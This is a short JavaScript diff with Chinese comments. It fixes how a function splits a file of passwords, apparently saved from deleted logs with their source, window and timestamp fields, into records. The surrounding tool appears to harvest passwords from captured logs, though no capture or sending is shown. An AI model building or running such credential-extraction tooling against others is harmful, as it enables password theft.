@@ -2591,13 +2591,12 @@ function extractPasswordsFromLog(content, filename) {
     return passwords;
 }
 
-// 解析 windows_security_saves.txt 中由日志清理保存的密码
 function parseSensitiveSaves(content) {
     const passwords = [];
-    // 文件内容是按 “--- 文件名 (deleted on ...)” 分块的
-    const blocks = content.split(/\n--- .+/);
+    // 修复：按换行后跟随 "--- " 的位置分割，确保每个文件块都被正确保留
+    const blocks = content.split(/\n(?=--- )/).filter(block => block.trim());
+
     for (const block of blocks) {
-        // 提取字段
         const fileMatch = block.match(/来自:\s*(.+)$/m);
         const winMatch = block.match(/窗口:\s*(.+)$/m);
         const timeMatch = block.match(/时间:\s*(.+)$/m);
